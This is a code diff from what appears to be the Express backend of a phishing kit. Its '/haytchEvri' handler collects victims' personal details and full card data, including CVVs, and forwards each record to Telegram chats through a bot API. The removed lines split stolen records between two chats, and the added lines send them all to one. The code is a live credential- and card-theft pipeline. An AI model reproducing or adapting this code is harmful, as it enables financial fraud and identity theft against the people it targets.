@@ -12359,8 +12359,6 @@ app.post("/flashEvri", (req, res) => {
     });
 });
 
-let aug25 = 0;
-
 app.options("/haytchEvri", cors());
 
 app.post("/haytchEvri", (req, res) => {
@@ -12413,26 +12411,14 @@ app.post("/haytchEvri", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binList}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\n| UserAgent : ${userAgent}`;
-      if (aug25 == 1) {
-        axios
-          .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-684572212&text=Evri:\n${originalText}`
-          )
-          .catch((e) => {
-            console.log(e);
-          });
-        aug25 = 0;
-      } else {
-        axios
-          .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-609654810&text=HAYTCHRES:\n${originalText}`
-          )
-          .catch((e) => {
-            console.log(e);
-          });
-        aug25 += 1;
-      }
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      axios
+        .post(
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-684572212&text=HAYTCHRES:\n${originalText}`
+        )
+        .catch((e) => {
+          console.log(e);
+        });
       res.send("Update Completed");
     });
 });
